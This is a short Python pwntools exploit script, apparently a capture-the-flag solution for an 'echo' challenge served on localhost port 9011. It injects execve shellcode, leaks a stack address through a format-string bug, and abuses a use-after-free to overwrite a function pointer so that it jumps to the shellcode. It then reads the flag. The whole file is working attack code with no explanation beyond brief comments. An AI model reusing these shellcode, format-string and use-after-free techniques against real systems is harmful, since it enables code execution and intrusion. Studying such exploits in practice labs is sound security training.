from pwn import *

r = remote("localhost", 9011)

ebp_address_stack_fsb = b"%10$p"
start_payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

r.sendlineafter(b"hey, what's your name? : ", start_payload)

# Call echo2 - fsb to get ebp pushed address to stack
r.sendlineafter(b"> ", b"2")
r.recv()

r.sendline(ebp_address_stack_fsb)
start_payload_stack_address = int(r.recvline(), 16) - 0x20

# Call free of 'o'
r.sendlineafter(b"> ", b"4")
r.sendlineafter(b"Are you sure you want to exit? (y/n)", b"n")

# Call echo3 - UAF on 'o' that was just freed
# We can override (_QWORD *)o + 3 (greetings function)
r.sendlineafter(b"> ", b"3")

echo3_payload = b"a" * 24 + p64(start_payload_stack_address)
r.sendline(echo3_payload)

# Now (_QWORD *)o + 3 points to start of name
# So we will call it by calling either echo2 / echo3

r.sendlineafter(b"> ", b"2")
r.sendline(b"cat flag")

r.recv()
flag = r.recv().decode()[1:-1]
print("Flag is:", flag)